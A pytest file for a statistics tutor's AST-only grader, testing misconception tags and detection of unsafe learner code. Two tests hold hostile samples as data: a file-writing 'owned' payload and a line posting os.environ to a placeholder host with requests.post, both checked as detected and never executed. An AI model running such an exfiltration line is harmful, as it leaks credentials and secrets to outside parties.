"""Safety and structure tests for AST-only learner code analysis."""

from pathlib import Path

import pandas as pd

from probstat_tutor.curriculum import load_default_question_bank
from probstat_tutor.graders import (
    MAX_AST_NODES,
    analyze_python_code,
    combine_submission_evidence,
    grade_dataframe_result,
    grade_numeric,
)
from probstat_tutor.schemas import EvidenceVerdict, GradeResult, LearnerSubmission


def test_ast_analysis_extracts_calls_keywords_and_operators() -> None:
    analysis = analyze_python_code(
        "np.std(sample, ddof=1) / np.sqrt(len(sample))"
    )

    assert analysis.syntax_valid is True
    assert {call.path for call in analysis.calls} == {"len", "np.sqrt", "np.std"}
    assert any("ddof=1" in call.keyword_constants for call in analysis.calls)
    assert "Div" in analysis.operators
    assert analysis.unsafe_features == ()


def test_attribute_reference_is_not_mistaken_for_method_call() -> None:
    reference = analyze_python_code('df["value"].median')
    call = analyze_python_code('df["value"].median()')

    assert reference.calls == ()
    assert "df.median" in reference.attributes
    assert [feature.path for feature in call.calls] == ["df.median"]


def test_specific_ast_mismatches_have_observable_root_cause_tags() -> None:
    questions = {
        question.id: question for question in load_default_question_bank().questions
    }
    cases = (
        (
            questions["mean_median_python_01"],
            "8",
            'df["value"].median',
            "python_method_not_called",
        ),
        (
            questions["mean_median_python_01"],
            "10",
            'df["value"].iloc[len(df) // 2]',
            "uses_middle_without_averaging",
        ),
        (
            questions["variance_std_python_01"],
            "4",
            "s.var()",
            "returns_variance",
        ),
        (
            questions["variance_std_python_01"],
            "1.632993",
            "np.std(s)",
            "uses_population_ddof",
        ),
        (
            questions["sampling_standard_error_python_01"],
            "0.645497",
            "np.var(sample, ddof=1) / np.sqrt(len(sample))",
            "uses_variance_in_se_formula",
        ),
    )

    for question, answer, code, expected_tag in cases:
        submission = LearnerSubmission(answer=answer, python_code=code)
        result = combine_submission_evidence(
            question,
            submission,
            _numeric_answer_result(float(answer), question.expected_answer),
        )

        assert result.is_correct is False
        assert result.misconception_candidates == [expected_tag]
        assert result.findings[-1].source.value == "python_code"


def test_multi_position_iloc_is_not_labelled_as_single_position() -> None:
    question = next(
        question
        for question in load_default_question_bank().questions
        if question.id == "mean_median_python_01"
    )

    for code in (
        'df["value"].iloc[[1, 2]].mean()',
        'df["value"].iloc[1:3].mean()',
    ):
        submission = LearnerSubmission(answer="8", python_code=code)
        result = combine_submission_evidence(
            question,
            submission,
            _numeric_answer_result(8.0, question.expected_answer),
        )

        assert result.misconception_candidates == [
            "python_code_conflicts_with_answer"
        ]
        assert "uses_middle_without_averaging" not in result.misconception_candidates


def test_explicit_nonstandard_ddof_is_not_labelled_as_default_ddof() -> None:
    question = next(
        question
        for question in load_default_question_bank().questions
        if question.id == "variance_std_python_01"
    )

    for code in ("np.std(s, ddof=2)", "k = 1\nnp.std(s, ddof=k)"):
        submission = LearnerSubmission(answer="2", python_code=code)
        result = combine_submission_evidence(
            question,
            submission,
            _numeric_answer_result(2.0, question.expected_answer),
        )

        assert result.misconception_candidates == [
            "python_code_conflicts_with_answer"
        ]
        assert "uses_population_ddof" not in result.misconception_candidates


def test_nested_var_call_is_not_labelled_as_direct_variance_result() -> None:
    question = next(
        question
        for question in load_default_question_bank().questions
        if question.id == "variance_std_python_01"
    )
    submission = LearnerSubmission(
        answer="2",
        python_code="max(s.var(), s.std())",
    )

    result = combine_submission_evidence(
        question,
        submission,
        _numeric_answer_result(2.0, question.expected_answer),
    )

    assert result.misconception_candidates == ["python_code_conflicts_with_answer"]
    assert "returns_variance" not in result.misconception_candidates


def test_syntax_error_returns_stable_chinese_result() -> None:
    analysis = analyze_python_code("df.value.median(")

    assert analysis.syntax_valid is False
    assert analysis.node_count == 0
    assert analysis.error_zh is not None
    assert "语法错误" in analysis.error_zh
    assert "没有执行代码" in analysis.error_zh


def test_file_write_payload_is_detected_but_never_executed(tmp_path: Path) -> None:
    marker = tmp_path / "must-not-exist.txt"
    code = f"open({str(marker)!r}, 'w').write('owned')"

    analysis = analyze_python_code(code)

    assert marker.exists() is False
    assert analysis.syntax_valid is True
    assert any("危险调用：open" == feature for feature in analysis.unsafe_features)


def test_environment_and_network_exfiltration_is_rejected() -> None:
    code = (
        "import os, requests\n"
        "requests.post('https://example.invalid', json=dict(os.environ))"
    )

    analysis = analyze_python_code(code)

    assert analysis.syntax_valid is True
    assert any("危险导入：os" == feature for feature in analysis.unsafe_features)
    assert any("敏感属性：os.environ" == feature for feature in analysis.unsafe_features)
    assert any("危险调用：requests.post" == feature for feature in analysis.unsafe_features)


def test_oversized_ast_is_bounded() -> None:
    code = "\n".join(f"value_{index} = {index}" for index in range(MAX_AST_NODES))

    analysis = analyze_python_code(code)

    assert analysis.syntax_valid is False
    assert analysis.node_count > MAX_AST_NODES
    assert analysis.error_zh is not None
    assert "超过静态分析限制" in analysis.error_zh


def test_deep_ast_is_bounded_independently_of_node_count() -> None:
    code = f"result = {'not ' * 45}True"

    analysis = analyze_python_code(code)

    assert analysis.syntax_valid is False
    assert analysis.node_count < MAX_AST_NODES
    assert analysis.error_zh is not None
    assert "超过静态分析限制" in analysis.error_zh


def test_unused_correct_call_cannot_hide_wrong_result_assignment() -> None:
    question = next(
        question
        for question in load_default_question_bank().questions
        if question.id == "variance_std_python_01"
    )
    submission = LearnerSubmission(
        answer="2",
        python_code="s.std()\nresult = 999",
    )

    result = combine_submission_evidence(
        question,
        submission,
        _numeric_answer_result(2.0, question.expected_answer),
    )

    assert result.is_correct is False
    assert result.misconception_candidates == ["python_code_conflicts_with_answer"]


def test_extra_sign_or_multiply_by_zero_invalidates_result_structure() -> None:
    question = next(
        question
        for question in load_default_question_bank().questions
        if question.id == "variance_std_python_01"
    )

    for code in ("result = -s.std()", "result = s.std() * 0"):
        submission = LearnerSubmission(answer="2", python_code=code)
        result = combine_submission_evidence(
            question,
            submission,
            _numeric_answer_result(2.0, question.expected_answer),
        )

        assert result.is_correct is False
        assert result.misconception_candidates == [
            "python_code_conflicts_with_answer"
        ]


def test_wrapper_calls_cannot_hide_wrong_median_or_std_result() -> None:
    questions = {
        question.id: question for question in load_default_question_bank().questions
    }
    cases = (
        (
            questions["mean_median_python_01"],
            "8",
            'result = min(df["value"].median(), 0)',
        ),
        (
            questions["variance_std_python_01"],
            "2",
            "result = max(s.std(), 999)",
        ),
    )

    for question, answer, code in cases:
        submission = LearnerSubmission(answer=answer, python_code=code)
        result = combine_submission_evidence(
            question,
            submission,
            _numeric_answer_result(float(answer), question.expected_answer),
        )

        assert result.is_correct is False
        assert result.misconception_candidates == [
            "python_code_conflicts_with_answer"
        ]


def test_backward_slice_accepts_connected_step_by_step_formula() -> None:
    question = next(
        question
        for question in load_default_question_bank().questions
        if question.id == "sampling_standard_error_python_01"
    )
    submission = LearnerSubmission(
        answer="1.2909944487",
        python_code=(
            "sd = np.std(sample, ddof=1)\n"
            "n = len(sample)\n"
            "root = np.sqrt(n)\n"
            "result = sd / root"
        ),
    )

    result = combine_submission_evidence(
        question,
        submission,
        _numeric_answer_result(1.2909944487, question.expected_answer),
    )

    assert result.is_correct is True
    assert result.misconception_candidates == []


def test_backward_slice_does_not_use_a_future_reassignment() -> None:
    question = next(
        question
        for question in load_default_question_bank().questions
        if question.id == "sampling_standard_error_python_01"
    )
    submission = LearnerSubmission(
        answer="1.2909944487",
        python_code=(
            "sd = 999\n"
            "tmp = sd\n"
            "sd = np.std(sample, ddof=1)\n"
            "root = np.sqrt(len(sample))\n"
            "result = tmp / root"
        ),
    )

    result = combine_submission_evidence(
        question,
        submission,
        _numeric_answer_result(1.2909944487, question.expected_answer),
    )

    assert result.is_correct is False
    assert result.misconception_candidates == ["python_code_conflicts_with_answer"]


def test_backward_slice_preserves_value_captured_before_reassignment() -> None:
    question = next(
        question
        for question in load_default_question_bank().questions
        if question.id == "sampling_standard_error_python_01"
    )
    submission = LearnerSubmission(
        answer="1.2909944487",
        python_code=(
            "sd = np.std(sample, ddof=1)\n"
            "root = np.sqrt(len(sample))\n"
            "se = sd / root\n"
            "sd = 0\n"
            "result = se"
        ),
    )

    result = combine_submission_evidence(
        question,
        submission,
        _numeric_answer_result(1.2909944487, question.expected_answer),
    )

    assert result.is_correct is True
    assert result.misconception_candidates == []


def test_reversed_standard_error_formula_is_rejected() -> None:
    question = next(
        question
        for question in load_default_question_bank().questions
        if question.id == "sampling_standard_error_python_01"
    )
    submission = LearnerSubmission(
        answer="1.2909944487",
        python_code="np.sqrt(len(sample)) / np.std(sample, ddof=1)",
    )

    result = combine_submission_evidence(
        question,
        submission,
        _numeric_answer_result(1.2909944487, question.expected_answer),
    )

    assert result.is_correct is False
    assert result.misconception_candidates == ["python_code_conflicts_with_answer"]


def test_confidence_interval_offset_order_is_validated() -> None:
    question = next(
        question
        for question in load_default_question_bank().questions
        if question.id == "confidence_interval_python_01"
    )
    answer_result = grade_dataframe_result(
        actual=_one_row([46.08, 53.92]),
        expected=_one_row(question.expected_answer),
        absolute_tolerance=question.numeric_tolerance or 0.0,
    )

    cases = (
        ("[1, 1]", "adds_margin_both_sides"),
        ("[1, -1]", "reversed_interval_endpoints"),
    )
    for offsets, expected_tag in cases:
        submission = LearnerSubmission(
            answer="[46.08, 53.92]",
            python_code=(
                f"mean + np.array({offsets}) * 1.96 * standard_error"
            ),
        )
        result = combine_submission_evidence(question, submission, answer_result)

        assert result.is_correct is False
        assert result.misconception_candidates == [expected_tag]


def test_scattered_features_do_not_form_one_valid_result_expression() -> None:
    question = next(
        question
        for question in load_default_question_bank().questions
        if question.id == "sampling_standard_error_python_01"
    )
    submission = LearnerSubmission(
        answer="1.2909944487",
        python_code=(
            "np.std(sample, ddof=1)\n"
            "np.sqrt(len(sample))\n"
            "result = 1.2909944487"
        ),
    )

    result = combine_submission_evidence(
        question,
        submission,
        _numeric_answer_result(1.2909944487, question.expected_answer),
    )

    assert result.is_correct is False
    assert result.misconception_candidates == ["python_code_conflicts_with_answer"]


def test_hardcoded_interval_is_not_accepted_as_formula_structure() -> None:
    question = next(
        question
        for question in load_default_question_bank().questions
        if question.id == "confidence_interval_python_01"
    )
    submission = LearnerSubmission(
        answer="[46.08, 53.92]",
        python_code="interval = [46.08, 53.92]",
    )
    answer_result = grade_dataframe_result(
        actual=_one_row([46.08, 53.92]),
        expected=_one_row(question.expected_answer),
        absolute_tolerance=question.numeric_tolerance or 0.0,
    )

    result = combine_submission_evidence(question, submission, answer_result)

    assert result.is_correct is False
    assert result.misconception_candidates == ["hardcoded_result_not_implementation"]
    assert result.findings[-1].verdict == EvidenceVerdict.CONTRADICTS


def _one_row(values: list[float]) -> pd.DataFrame:
    return pd.DataFrame([values])


def _numeric_answer_result(actual: float, expected: object) -> GradeResult:
    return grade_numeric(actual, expected, absolute_tolerance=0.000001)
